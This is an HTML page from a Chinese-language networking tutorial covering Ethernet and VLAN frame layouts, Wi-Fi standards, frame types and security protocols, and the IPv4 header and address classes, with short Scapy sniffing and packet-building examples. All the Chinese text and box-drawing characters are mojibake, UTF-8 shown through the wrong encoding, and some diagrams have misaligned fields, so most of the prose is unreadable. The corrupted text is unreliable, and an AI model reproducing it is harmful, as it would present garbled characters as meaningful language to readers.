<pre><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                        ä»¥å¤ªç½‘å¸§ç»“æ„                                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å‰å¯¼ç    â”‚ ç›®æ ‡MAC  â”‚ æºMAC    â”‚ ç±»å‹     â”‚ æ•°æ®     â”‚   FCS    â”‚
â”‚ Preamble â”‚   Dst    â”‚  Src     â”‚  Type    â”‚  Data    â”‚   CRC    â”‚
â”‚ 7 bytes  â”‚ 6 bytes  â”‚ 6 bytes  â”‚ 2 bytes  â”‚ 46-1500  â”‚ 4 bytes  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  SFD (å¸§èµ·å§‹å®šç•Œç¬¦) : 1 byte                                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>å­—æ®µè¯¦è§£</strong>:</p>
<ol>
<li>
<p><strong>å‰å¯¼ç  (Preamble)</strong>: 7å­—èŠ‚ï¼Œç”¨äºåŒæ­¥</p>
<pre><code>10101010 10101010 10101010 10101010 10101010 10101010 10101010
</code></pre>
</li>
<li>
<p><strong>SFD (Start Frame Delimiter)</strong>: 1å­—èŠ‚</p>
<pre><code>10101011  # æ ‡è¯†å¸§çš„çœŸæ­£å¼€å§‹
</code></pre>
</li>
<li>
<p><strong>ç›®æ ‡MACåœ°å€</strong>: 6å­—èŠ‚</p>
<pre><code>ç¤ºä¾‹: FF:FF:FF:FF:FF:FF (å¹¿æ’­åœ°å€)
      00:1A:2B:3C:4D:5E (å•æ’­åœ°å€)
</code></pre>
</li>
<li>
<p><strong>æºMACåœ°å€</strong>: 6å­—èŠ‚</p>
<pre><code>ç¤ºä¾‹: 00:0C:29:6F:8A:9B
</code></pre>
</li>
<li>
<p><strong>ç±»å‹/é•¿åº¦å­—æ®µ</strong>: 2å­—èŠ‚</p>
<pre><code>0x0800: IPv4
0x0806: ARP
0x86DD: IPv6
0x8100: VLANæ ‡ç­¾
</code></pre>
</li>
<li>
<p><strong>æ•°æ®å­—æ®µ</strong>: 46-1500å­—èŠ‚</p>
<ul>
<li>æœ€å°46å­—èŠ‚ï¼ˆä¸è¶³éœ€å¡«å……ï¼‰</li>
<li>æœ€å¤§1500å­—èŠ‚ï¼ˆMTUï¼‰</li>
</ul>
</li>
<li>
<p><strong>FCS (Frame Check Sequence)</strong>: 4å­—èŠ‚CRCæ ¡éªŒ</p>
</li>
</ol>
<h4 id="ethernetå·¥ä½œåŸç†"><a class="header" href="#ethernetå·¥ä½œåŸç†">Ethernetå·¥ä½œåŸç†</a></h4>
<p><strong>CSMA/CD (è½½æ³¢ä¾¦å¬å¤šè·¯è®¿é—®/å†²çªæ£€æµ‹)</strong></p>
<pre><code>å‘é€æµç¨‹:
1. ç›‘å¬ä¿¡é“ â†’ ç©ºé—²?
   â”œâ”€ æ˜¯ â†’ å‘é€æ•°æ®
   â””â”€ å¦ â†’ ç»§ç»­ç›‘å¬

2. å‘é€è¿‡ç¨‹ä¸­ç›‘å¬å†²çª
   â”œâ”€ æ— å†²çª â†’ å‘é€å®Œæˆ
   â””â”€ æ£€æµ‹åˆ°å†²çª â†’ åœæ­¢å‘é€
       â”œâ”€ å‘é€å¹²æ‰°ä¿¡å·
       â”œâ”€ ç­‰å¾…éšæœºæ—¶é—´
       â””â”€ é‡æ–°å‘é€
</code></pre>
<p><strong>å®æˆ˜ç¤ºä¾‹ï¼šæŠ“å–ä»¥å¤ªç½‘å¸§</strong></p>
<pre><code class="language-python">from scapy.all import *

def analyze_ethernet_frame(packet):
    """åˆ†æä»¥å¤ªç½‘å¸§"""
    if packet.haslayer(Ether):
        eth = packet[Ether]
        print(f"æºMAC: {eth.src}")
        print(f"ç›®æ ‡MAC: {eth.dst}")
        print(f"ç±»å‹: {hex(eth.type)}")

        # è§£æä¸Šå±‚åè®®
        if eth.type == 0x0800:
            print("ä¸Šå±‚åè®®: IPv4")
        elif eth.type == 0x0806:
            print("ä¸Šå±‚åè®®: ARP")
        elif eth.type == 0x86DD:
            print("ä¸Šå±‚åè®®: IPv6")

# æŠ“åŒ…åˆ†æ
sniff(prn=analyze_ethernet_frame, count=10)
</code></pre>
<h4 id="vlan-è™šæ‹Ÿå±€åŸŸç½‘"><a class="header" href="#vlan-è™šæ‹Ÿå±€åŸŸç½‘">VLAN (è™šæ‹Ÿå±€åŸŸç½‘)</a></h4>
<p><strong>VLANæ ‡ç­¾æ ¼å¼</strong>:</p>
<pre><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  TPID (Tag Protocol Identifier)    â”‚  0x8100 (2 bytes)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  TCI (Tag Control Information)     â”‚  2 bytes
â”‚  â”œâ”€ PRI (Priority): 3 bits         â”‚
â”‚  â”œâ”€ CFI (Canonical Format): 1 bit  â”‚
â”‚  â””â”€ VID (VLAN ID): 12 bits         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>VLANé…ç½®ç¤ºä¾‹</strong>:</p>
<pre><code class="language-python">from scapy.all import Ether, Dot1Q, IP, ICMP

# åˆ›å»ºå¸¦VLANæ ‡ç­¾çš„æ•°æ®åŒ…
packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
         Dot1Q(vlan=10) / \
         IP(dst="192.168.1.1") / \
         ICMP()

# æŸ¥çœ‹æ•°æ®åŒ…ç»“æ„
packet.show()
</code></pre>
<h3 id="32-wi-fi-æ— çº¿å±€åŸŸç½‘-åè®®"><a class="header" href="#32-wi-fi-æ— çº¿å±€åŸŸç½‘-åè®®">3.2 Wi-Fi (æ— çº¿å±€åŸŸç½‘) åè®®</a></h3>
<h4 id="wi-fiåè®®æ—"><a class="header" href="#wi-fiåè®®æ—">Wi-Fiåè®®æ—</a></h4>
<div class="table-wrapper"><table><thead><tr><th>æ ‡å‡†</th><th>é¢‘æ®µ</th><th>æœ€å¤§é€Ÿç‡</th><th>å‘å¸ƒå¹´ä»½</th><th>ç‰¹ç‚¹</th></tr></thead><tbody>
<tr><td><strong>802.11b</strong></td><td>2.4 GHz</td><td>11 Mbps</td><td>1999</td><td>æœ€æ—©çš„å•†ç”¨æ ‡å‡†</td></tr>
<tr><td><strong>802.11a</strong></td><td>5 GHz</td><td>54 Mbps</td><td>1999</td><td>æŠ—å¹²æ‰°èƒ½åŠ›å¼º</td></tr>
<tr><td><strong>802.11g</strong></td><td>2.4 GHz</td><td>54 Mbps</td><td>2003</td><td>å…¼å®¹802.11b</td></tr>
<tr><td><strong>802.11n</strong></td><td>2.4/5 GHz</td><td>600 Mbps</td><td>2009</td><td>MIMOæŠ€æœ¯</td></tr>
<tr><td><strong>802.11ac</strong></td><td>5 GHz</td><td>6.93 Gbps</td><td>2013</td><td>MU-MIMO</td></tr>
<tr><td><strong>802.11ax (Wi-Fi 6)</strong></td><td>2.4/5 GHz</td><td>9.6 Gbps</td><td>2019</td><td>OFDMA</td></tr>
<tr><td><strong>802.11be (Wi-Fi 7)</strong></td><td>2.4/5/6 GHz</td><td>46 Gbps</td><td>2024</td><td>MLO</td></tr>
</tbody></table>
</div>
<h4 id="wi-fiå¸§ç»“æ„"><a class="header" href="#wi-fiå¸§ç»“æ„">Wi-Fiå¸§ç»“æ„</a></h4>
<pre><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    802.11 MACå¸§æ ¼å¼                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚Frame â”‚Durationâ”‚Addr1 â”‚Addr2 â”‚Addr3 â”‚Seq  â”‚Addr4 â”‚Frame Bodyâ”‚FCSâ”‚
â”‚Controlâ”‚/ID   â”‚      â”‚      â”‚      â”‚Ctrl â”‚      â”‚          â”‚   â”‚
â”‚2 bytesâ”‚2 bytesâ”‚6 bytesâ”‚6 bytesâ”‚6 bytesâ”‚2 bytesâ”‚6 bytesâ”‚0-2312â”‚4 bytesâ”‚
â””â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”˜
</code></pre>
<p><strong>Frame Controlå­—æ®µè¯¦è§£</strong>:</p>
<pre><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚     Frame Control (2 bytes)        â”‚
â”œâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚Versionâ”‚Typeâ”‚SubTypeâ”‚To DSâ”‚From DSâ”‚More Fragâ”‚Retryâ”‚Power Mgmtâ”‚More Dataâ”‚WEPâ”‚Orderâ”‚
â”‚2 bits â”‚2 bitsâ”‚4 bits â”‚1 bitâ”‚1 bit â”‚1 bit   â”‚1 bitâ”‚1 bit    â”‚1 bit   â”‚1 bitâ”‚1 bitâ”‚
â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>å¸§ç±»å‹</strong>:</p>
<ol>
<li>
<p><strong>ç®¡ç†å¸§ (Management Frame)</strong></p>
<ul>
<li>Beacon: ä¿¡æ ‡å¸§ï¼ŒAPå®šæœŸå¹¿æ’­</li>
<li>Probe Request/Response: æ¢æµ‹è¯·æ±‚/å“åº”</li>
<li>Authentication: è®¤è¯</li>
<li>Association Request/Response: å…³è”è¯·æ±‚/å“åº”</li>
<li>Deauthentication: è§£é™¤è®¤è¯</li>
</ul>
</li>
<li>
<p><strong>æ§åˆ¶å¸§ (Control Frame)</strong></p>
<ul>
<li>RTS (Request To Send): è¯·æ±‚å‘é€</li>
<li>CTS (Clear To Send): å…è®¸å‘é€</li>
<li>ACK: ç¡®è®¤å¸§</li>
</ul>
</li>
<li>
<p><strong>æ•°æ®å¸§ (Data Frame)</strong></p>
<ul>
<li>ä¼ è¾“å®é™…æ•°æ®</li>
</ul>
</li>
</ol>
<h4 id="wi-fiè¿æ¥è¿‡ç¨‹"><a class="header" href="#wi-fiè¿æ¥è¿‡ç¨‹">Wi-Fiè¿æ¥è¿‡ç¨‹</a></h4>
<pre><code>å®¢æˆ·ç«¯                                  AP (æ¥å…¥ç‚¹)
   â”‚                                      â”‚
   â”‚â”€â”€â”€â”€â”€â”€â”€ Probe Request â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚  (æ‰«æå¯ç”¨ç½‘ç»œ)
   â”‚                                      â”‚
   â”‚â†â”€â”€â”€â”€â”€â”€ Probe Response â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚  (è¿”å›ç½‘ç»œä¿¡æ¯)
   â”‚                                      â”‚
   â”‚â”€â”€â”€â”€â”€â”€â”€ Authentication Request â”€â”€â”€â”€â”€â†’â”‚  (è¯·æ±‚è®¤è¯)
   â”‚                                      â”‚
   â”‚â†â”€â”€â”€â”€â”€â”€ Authentication Response â”€â”€â”€â”€â”€â”‚  (è®¤è¯æˆåŠŸ)
   â”‚                                      â”‚
   â”‚â”€â”€â”€â”€â”€â”€â”€ Association Request â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚  (è¯·æ±‚å…³è”)
   â”‚                                      â”‚
   â”‚â†â”€â”€â”€â”€â”€â”€ Association Response â”€â”€â”€â”€â”€â”€â”€â”€â”‚  (å…³è”æˆåŠŸ)
   â”‚                                      â”‚
   â”‚â”€â”€â”€â”€â”€â”€â”€ EAPOL (4-Way Handshake) â”€â”€â”€â”€â†’â”‚  (WPAå¯†é’¥äº¤æ¢)
   â”‚â†â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚
   â”‚                                      â”‚
   â”‚ â•â•â•â•â•â•â•â• æ•°æ®ä¼ è¾“ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â†’â”‚
   â”‚                                      â”‚
</code></pre>
<p><strong>å®æˆ˜ç¤ºä¾‹ï¼šWi-FiæŠ“åŒ…åˆ†æ</strong></p>
<pre><code class="language-python">from scapy.all import *

def wifi_packet_handler(packet):
    """åˆ†æWi-Fiæ•°æ®åŒ…"""
    if packet.haslayer(Dot11):
        # è·å–å¸§ç±»å‹
        frame_type = packet.type
        frame_subtype = packet.subtype

        # ç®¡ç†å¸§
        if frame_type == 0:
            if frame_subtype == 8:  # Beaconå¸§
                ssid = packet.info.decode('utf-8', errors='ignore')
                bssid = packet.addr3
                print(f"[Beacon] SSID: {ssid}, BSSID: {bssid}")
            elif frame_subtype == 4:  # Probe Request
                print(f"[Probe Request] from {packet.addr2}")

        # æ•°æ®å¸§
        elif frame_type == 2:
            print(f"[Data] {packet.addr2} -&gt; {packet.addr1}")

# ç›‘å¬Wi-Fi (éœ€è¦ç½‘å¡æ”¯æŒç›‘å¬æ¨¡å¼)
# sniff(iface="wlan0mon", prn=wifi_packet_handler)
</code></pre>
<h4 id="wi-fiå®‰å…¨åè®®"><a class="header" href="#wi-fiå®‰å…¨åè®®">Wi-Fiå®‰å…¨åè®®</a></h4>
<p><strong>1. WEP (Wired Equivalent Privacy)</strong> - å·²åºŸå¼ƒ</p>
<pre><code>é—®é¢˜: ä½¿ç”¨é™æ€å¯†é’¥ï¼Œå®¹æ˜“è¢«ç ´è§£
</code></pre>
<p><strong>2. WPA (Wi-Fi Protected Access)</strong></p>
<pre><code>æ”¹è¿›: ä½¿ç”¨TKIPåŠ¨æ€å¯†é’¥
è®¤è¯: PSK (Pre-Shared Key) æˆ– 802.1X
</code></pre>
<p><strong>3. WPA2 (AES-CCMP)</strong></p>
<pre><code>åŠ å¯†: AES (é«˜çº§åŠ å¯†æ ‡å‡†)
å®Œæ•´æ€§: CCMP (Counter Mode with CBC-MAC Protocol)
</code></pre>
<p><strong>4. WPA3</strong></p>
<pre><code>ç‰¹æ€§:
- SAE (Simultaneous Authentication of Equals) æ¡æ‰‹
- å‰å‘ä¿å¯† (Forward Secrecy)
- 192ä½åŠ å¯†å¥—ä»¶ (ä¼ä¸šçº§)
- ç®€åŒ–çš„è®¾å¤‡é…ç½®
</code></pre>
<hr />
<h2 id="ç¬¬å››ç« ç½‘ç»œå±‚åè®®"><a class="header" href="#ç¬¬å››ç« ç½‘ç»œå±‚åè®®">ç¬¬å››ç« ï¼šç½‘ç»œå±‚åè®®</a></h2>
<h3 id="41-ip-internet-protocol-åè®®"><a class="header" href="#41-ip-internet-protocol-åè®®">4.1 IP (Internet Protocol) åè®®</a></h3>
<h4 id="ipv4æ•°æ®åŒ…ç»“æ„"><a class="header" href="#ipv4æ•°æ®åŒ…ç»“æ„">IPv4æ•°æ®åŒ…ç»“æ„</a></h4>
<pre><code> 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
â”Œâ”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚Versionâ”‚  IHL  â”‚Type of Serviceâ”‚         Total Length          â”‚
â”‚ 4 bitsâ”‚ 4 bitsâ”‚    8 bits     â”‚           16 bits             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚         Identification        â”‚Flagsâ”‚    Fragment Offset      â”‚
â”‚           16 bits             â”‚3 bitsâ”‚       13 bits           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Time to Live â”‚   Protocol    â”‚      Header Checksum          â”‚
â”‚    8 bits     â”‚    8 bits     â”‚           16 bits             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                     Source IP Address                         â”‚
â”‚                          32 bits                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                  Destination IP Address                       â”‚
â”‚                          32 bits                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                    Options (if IHL &gt; 5)                       â”‚
â”‚                         Variable                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                          Data                                 â”‚
â”‚                         Variable                              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>å­—æ®µè¯¦è§£</strong>:</p>
<ol>
<li>
<p><strong>Version (4 bits)</strong>: ç‰ˆæœ¬å·</p>
<ul>
<li>IPv4 = 4</li>
<li>IPv6 = 6</li>
</ul>
</li>
<li>
<p><strong>IHL (Internet Header Length, 4 bits)</strong>: å¤´éƒ¨é•¿åº¦</p>
<ul>
<li>å•ä½: 32ä½å­—(4å­—èŠ‚)</li>
<li>èŒƒå›´: 5-15 (20-60å­—èŠ‚)</li>
<li>ç¤ºä¾‹: IHL=5 è¡¨ç¤º20å­—èŠ‚å¤´éƒ¨</li>
</ul>
</li>
<li>
<p><strong>Type of Service (8 bits)</strong>: æœåŠ¡ç±»å‹</p>
<pre><code>â”Œâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”
â”‚ Precedence â”‚   D  â”‚  T  â”‚  R  â”‚ C â”‚  0  â”‚
â”‚  (3 bits)  â”‚(Delay)â”‚(Throughput)â”‚(Reliability)â”‚(Cost)â”‚(Reserved)â”‚
â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”˜
</code></pre>
</li>
<li>
<p><strong>Total Length (16 bits)</strong>: æ€»é•¿åº¦</p>
<ul>
<li>åŒ…æ‹¬å¤´éƒ¨å’Œæ•°æ®</li>
<li>æœ€å¤§: 65535å­—èŠ‚</li>
</ul>
</li>
<li>
<p><strong>Identification (16 bits)</strong>: æ ‡è¯†ç¬¦</p>
<ul>
<li>ç”¨äºåˆ†ç‰‡é‡ç»„</li>
<li>åŒä¸€æ•°æ®æŠ¥çš„æ‰€æœ‰åˆ†ç‰‡å…·æœ‰ç›¸åŒæ ‡è¯†</li>
</ul>
</li>
<li>
<p><strong>Flags (3 bits)</strong>: æ ‡å¿—ä½</p>
<pre><code>â”Œâ”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”
â”‚  0  â”‚ DF  â”‚ MF  â”‚
â””â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”˜
DF (Don't Fragment): 1è¡¨ç¤ºä¸åˆ†ç‰‡
MF (More Fragments): 1è¡¨ç¤ºåé¢è¿˜æœ‰åˆ†ç‰‡
</code></pre>
</li>
<li>
<p><strong>Fragment Offset (13 bits)</strong>: åˆ†ç‰‡åç§»</p>
<ul>
<li>å•ä½: 8å­—èŠ‚</li>
<li>è¡¨ç¤ºå½“å‰åˆ†ç‰‡åœ¨åŸå§‹æ•°æ®ä¸­çš„ä½ç½®</li>
</ul>
</li>
<li>
<p><strong>Time to Live (8 bits)</strong>: ç”Ÿå­˜æ—¶é—´</p>
<ul>
<li>æ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨å‡1</li>
<li>ä¸º0æ—¶ä¸¢å¼ƒæ•°æ®åŒ…</li>
<li>é˜²æ­¢æ•°æ®åŒ…æ— é™å¾ªç¯</li>
</ul>
</li>
<li>
<p><strong>Protocol (8 bits)</strong>: ä¸Šå±‚åè®®</p>
<pre><code>1  : ICMP
6  : TCP
17 : UDP
41 : IPv6
89 : OSPF
</code></pre>
</li>
<li>
<p><strong>Header Checksum (16 bits)</strong>: å¤´éƒ¨æ ¡éªŒå’Œ</p>
<ul>
<li>ä»…æ ¡éªŒå¤´éƒ¨ï¼Œä¸æ ¡éªŒæ•°æ®</li>
<li>æ¯è·³éƒ½éœ€é‡æ–°è®¡ç®—</li>
</ul>
</li>
<li>
<p><strong>Source/Destination IP Address (32 bits each)</strong>: æº/ç›®æ ‡IPåœ°å€</p>
</li>
</ol>
<h4 id="ipv4åœ°å€åˆ†ç±»"><a class="header" href="#ipv4åœ°å€åˆ†ç±»">IPv4åœ°å€åˆ†ç±»</a></h4>
<pre><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Aç±»: 0.0.0.0 - 127.255.255.255                            â”‚
â”‚      ç½‘ç»œä½: 8 bits | ä¸»æœºä½: 24 bits                      â”‚
â”‚      é»˜è®¤å­ç½‘æ©ç : 255.0.0.0                               â”‚
â”‚      ç¤ºä¾‹: 10.0.0.1 (ç§æœ‰åœ°å€)                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Bç±»: 128.0.0.0 - 191.255.255.255                          â”‚
â”‚      ç½‘ç»œä½: 16 bits | ä¸»æœºä½: 16 bits                     â”‚
â”‚      é»˜è®¤å­ç½‘æ©ç : 255.255.0.0                             â”‚
â”‚      ç¤ºä¾‹: 172.16.0.1 (ç§æœ‰åœ°å€)                           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Cç±»: 192.0.0.0 - 223.255.255.255                          â”‚
â”‚      ç½‘ç»œä½: 24 bits | ä¸»æœºä½: 8 bits                      â”‚
â”‚      é»˜è®¤å­ç½‘æ©ç : 255.255.255.0                           â”‚
â”‚      ç¤ºä¾‹: 192.168.1.1 (ç§æœ‰åœ°å€)                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Dç±»: 224.0.0.0 - 239.255.255.255  (ç»„æ’­åœ°å€)              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Eç±»: 240.0.0.0 - 255.255.255.255  (ä¿ç•™)                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>ç§æœ‰åœ°å€èŒƒå›´</strong>:</p>
